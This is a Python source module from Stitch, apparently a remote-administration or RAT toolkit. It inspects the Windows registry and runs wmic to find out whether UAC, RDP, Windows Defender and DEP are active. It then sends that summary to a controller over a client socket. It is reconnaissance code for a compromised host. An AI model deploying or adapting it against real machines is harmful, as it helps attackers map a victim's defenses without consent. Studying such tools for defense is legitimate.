# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

scansum = ''

def windefnd_scan():
    defender = reg_exists('SOFTWARE\\Microsoft\\Windows Defender')
    if not defender: defender = reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    return bool(defender)

def windefnd_running():
    key = False
    if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Microsoft\\Windows Defender')
    if key:
        try:
            val=_winreg.QueryValueEx(key, "DisableAntiSpyware")
            return val[0] != 1
        except:
            return False

def check_uac():
    uac_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
    val=_winreg.QueryValueEx(uac_key, "EnableLUA")
    return val[0] == 1

def check_rdp():
    rdp_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Control\\Terminal Server')
    val=_winreg.QueryValueEx(rdp_key, "fDenyTSConnections")
    return val[0] == 0

def check_dep():
    dep_mode = run_command('wmic OS get DataExecutionPrevention_SupportPolicy')
    if "0" in dep_mode:
        return "   DEP: OFF for the whole system.\n"
    elif "1" in dep_mode:
        return "   DEP: FULL coverage for the whole system with no exceptions.\n"
    elif "2" in dep_mode:
        return "   DEP: LIMITED to Windows system binaries.\n"
    elif "3" in dep_mode:
        return "   DEP: ON for all programs and services.\n"
    else:
        return dep_mode

scansum += '   UAC: ON\n' if check_uac() else "   UAC: OFF\n"
scansum += '   RDP: ON\n' if check_rdp() else '   RDP: OFF\n'
if windefnd_scan():
    if windefnd_running():
        scansum += '   Windows Defender: ON\n'
    else:
        scansum += '   Windows Defender: OFF\n'
else:
    scansum += "   Windows Defender: NOT INSTALLED\n"

scansum += check_dep()


send(client_socket,scansum)
